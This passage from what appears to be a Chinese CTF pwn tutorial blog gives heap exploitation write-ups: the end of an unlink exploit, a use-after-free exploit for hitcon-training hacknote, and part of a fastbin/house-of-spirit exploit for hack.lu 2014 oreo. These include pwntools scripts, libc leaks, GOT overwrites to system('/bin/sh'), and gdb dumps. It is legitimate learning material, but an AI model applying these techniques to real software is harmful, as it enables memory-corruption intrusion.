class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the new content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="string">'a'</span>*<span class="number">0x8</span>) <span class="comment">#idx0</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>) <span class="comment">#idx1</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x80</span>) <span class="comment">#idx2</span></span><br><span class="line">    ptr = <span class="number">0x6020c8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    atol_got = elf.got[<span class="string">'atol'</span>]</span><br><span class="line">    atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr+<span class="number">8</span>) + p64(elf.got[<span class="string">'free'</span>]) </span><br><span class="line">    <span class="comment">#payload = 'a'*0x18 + p64(free_got) + p64(puts_got)</span></span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    <span class="comment">#edit(0, p64(puts_plt)[:-1])</span></span><br><span class="line">    edit(<span class="number">1</span>, p64(elf.plt[<span class="string">'puts'</span>])[:<span class="number">-1</span>])</span><br><span class="line">    <span class="comment">#delete(1)</span></span><br><span class="line">    edit(<span class="number">0</span>, p64(atol_got))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    atol_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    libc_base = atol_addr - libc.symbols[<span class="string">'atol'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    io.success(<span class="string">"atol_got: 0x%x"</span> % atol_got)</span><br><span class="line">    edit(<span class="number">0</span>, p64(atoi_got))</span><br><span class="line">    edit(<span class="number">1</span>, p64(system_addr)[:<span class="number">-1</span>])</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh;#"</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>unlink部分完结了</li>
<li>unlink部分学习时间4天，现在对于unlink轻车熟路了，不过通常不是单一漏洞点，单一的好分析点</li>
<li>要多学学逆向，逆向起复杂的题目来真的难，像那个机器人那题，我连漏洞点都找不到，真的惨</li>
<li>我觉得机器人那题还有另外解法，因为4和5选项越界部分都没用上</li>
<li>感谢萝卜师傅的指导</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://bbs.pediy.com/thread-247007.htm" target="_blank" rel="noopener">看雪大佬</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/pwn-heap-learn-5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/pwn/pwn-heap-learn-5/" itemprop="url">pwn/pwn-heap-learn-5</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="pwn堆入门系列教程5"><a href="#pwn堆入门系列教程5" class="headerlink" title="pwn堆入门系列教程5"></a>pwn堆入门系列教程5</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn堆入门系列教程2</a><br><a href="https://xz.aliyun.com/t/6252" target="_blank" rel="noopener">pwn堆入门系列教程3</a><br><a href="https://xz.aliyun.com/t/6322" target="_blank" rel="noopener">pwn堆入门系列教程4</a></p>
<p>进入uaf学习了，这部分题目就一道题</p>
<h2 id="hitcon-training-hacknote"><a href="#hitcon-training-hacknote" class="headerlink" title="hitcon-training-hacknote"></a>hitcon-training-hacknote</h2><p>这道题其实很简单，不过要冷静下才能做，我当时有点急躁，浪费一个钟才搞出来？冷静下来10分钟懂了</p>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(notelist[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>具体分析不讲了，ctf-wiki上讲的很清楚， 我大致讲一下就是要利用要覆盖到他的content指针，这样的话print的时候会调用到另一个函数</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'hacknote'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'hacknote'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = elf.libc</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Note size :"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Content :"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Print</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ptr = <span class="number">0x08048986</span></span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">'bbbb'</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x8</span>, p32(ptr))</span><br><span class="line">    Print(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

<p>接下来进入fastbin attack,fastbin attack有三个题目</p>
<h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><p>补充函数说明：</p>
<ul>
<li>fgets函数会在输入完成后自动在结尾添加一个’\0’，比如我们输入1234加上我们的回车总共是1234’\x0a’’\x00’他sub_80485EC这个函数会将\x0a变成\x00<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2ydm1wq4ej30li04uwf2.jpg" alt="1"></li>
</ul>
<h3 id="结构体构造"><a href="#结构体构造" class="headerlink" title="结构体构造"></a>结构体构造</h3><p>开头调试的时候一直不理解他的结构体是如何构造出来的，然后ida解析出来的跟他图片上所谓结构体格格不入，所以手动调试了一下午，知道了他的结构体是如何构造的</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> decription[<span class="number">25</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">27</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个结构体是经过调试以及看汇编得出来的，</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048644</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = dword_804A288;</span><br><span class="line">  dword_804A288 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x38</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_804A288 )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_DWORD *)dword_804A288 + <span class="number">13</span>) = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rifle name: "</span>);</span><br><span class="line">    fgets(dword_804A288 + <span class="number">25</span>, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(dword_804A288 + <span class="number">25</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Rifle description: "</span>);</span><br><span class="line">    fgets(dword_804A288, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(dword_804A288);</span><br><span class="line">    ++dword_804A2A4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something terrible happened!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看出filename从25开始的，推出前面的description为25，而name长度为27是如何推出来的呢？看图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2f93s8owgj31hc0sjwrg.jpg" alt="2"></p>
<p>我这是在输出函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048729</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rifle to be ordered:\n%s\n"</span>, <span class="string">"==================================="</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = dword_804A288; i; i = (<span class="keyword">char</span> *)*((_DWORD *)i + <span class="number">13</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, i + <span class="number">25</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Description: %s\n"</span>, i);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"==================================="</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>这里下的断点，你看ida解析出来的什么鬼，i+13，莫名奇妙的写法，完全看不懂，然后我定位到这里断点后，他加的值是0x34，他是从结构体开头加的0x34(10进制:52)，然后取出下一个指针，也就是next指针，继续进行循环，ida解析出的i+13完全乱来的，52-25 = 27，所以大小就这么退出来了，不理解这个结构体，这道题很多写法都看不懂，比如他的偏移什么，理解了就好构造了。</p>
<h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h3><p>题目里有堆溢出，我们可以通过堆溢出溢出到结构体的next指针，让next指针指向got表某一项，从而泄露出地址，进而求出libc的地址，求出libc的地址过后，在利用house of sprit，free掉一个自己伪造的chunk,进而达到覆写got表成one_gadget，然后通过调用该函数获得权限</p>
<h3 id="初始化函数"><a href="#初始化函数" class="headerlink" title="初始化函数"></a>初始化函数</h3><p>将堆的各个操作写成函数，因为堆里有很多重复操作，所以这样会比较方便</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, description)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"5"</span>)</span><br></pre></td></tr></table></figure>

<h3 id="leak地址"><a href="#leak地址" class="headerlink" title="leak地址"></a>leak地址</h3><p>我们知道他有个next指针，所以我们覆盖掉他的next指针，在利用show函数就可以打印任意地址的内容了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#first leak the libc</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Description: "</span>)</span><br><span class="line">result = p.recvuntil(<span class="string">"==================================="</span>)[:<span class="number">4</span>]</span><br><span class="line">puts_addr = u32(result)</span><br><span class="line">log.success(<span class="string">"puts_got = &#123;:#x&#125;"</span>.format(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br></pre></td></tr></table></figure>

<p>这样就leak出puts的地址，接着就可以获得libc地址</p>
<h3 id="填充大小并修改next指针"><a href="#填充大小并修改next指针" class="headerlink" title="填充大小并修改next指针"></a>填充大小并修改next指针</h3><p>这题目有个计算数值的变量，也就是说你malloc一个，他就会加1，我们可以将这里当作chunk大小，因为一个枪支结构体大小为0x38,所以堆块大小为0x40,我们将其大小提升至0x40，并让最后一个堆块的next指针指向这块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">0x3f</span>:</span><br><span class="line">    add(<span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), <span class="string">'b'</span>*<span class="number">25</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0x804A2A8</span>)</span><br><span class="line">add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br></pre></td></tr></table></figure>

<p>0x804a2a4是count的地址，所以+4就是堆块的数据段</p>
<h3 id="绕过检测"><a href="#绕过检测" class="headerlink" title="绕过检测"></a>绕过检测</h3><ol>
<li><p>对齐检查<br>在此处的检查中，要求堆块具有16bytes对齐，所以chunk header的起始地址应为0x**0的形式。</p>
</li>
<li><p>fake chunk 的size大小检查<br>按照上文中chunk的结构布局，使当前fake chunk的size为合适的大小，能够充足利用并且加入fastbin(0x10-0x80)，</p>
</li>
<li><p>next chunk 的size大小检查<br>除了当前chunk的大小，与目标地址物理相邻的内存空间也应按照堆块的结构将size位置改写为能够加入fastbin的合适的大小的数值。</p>
</li>
<li><p>标记位检查</p>
</li>
</ol>
<p>This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREVINUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED_ (second lsb) and _NON_MAIN_ARENA (third lsb) bits cause problems…. note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### begin fake </span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">0x20</span> + p32(<span class="number">0x40</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x34</span>, <span class="string">'b'</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'c'</span>)</span><br><span class="line">edit(payload)</span><br><span class="line">delete()</span><br><span class="line">p.recvuntil(<span class="string">'Okay order submitted!\n'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/60wx 0x804a2c0-0x20</span><br><span class="line">0x804a2a0:	0x00000000	0x00000040	0x0804a2c0	0x00000000</span><br><span class="line">0x804a2b0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2c0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2d0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a2e0:	0x00000040	0x00000100	0x62626262	0x62626262</span><br><span class="line">0x804a2f0:	0x62626262	0x00000000	0x63636363	0x63636363</span><br><span class="line">0x804a300:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a310:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a320:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a330:	0x63636363	0x63636363	0x63636363	0x00636363</span><br><span class="line">0x804a340:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a350:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a360:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a370:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a380:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>

<p>可以看下内存中的内容,这就是构造完成后的图，然后free掉0x804a2a0这个大小为0x40的堆块，然后在fastbin中是FILO，所以你在申请的堆块就是申请到的是0x804a2a0这个堆块，在0x0804a2a8这个堆块的数据部分的东西就很重要了</p>
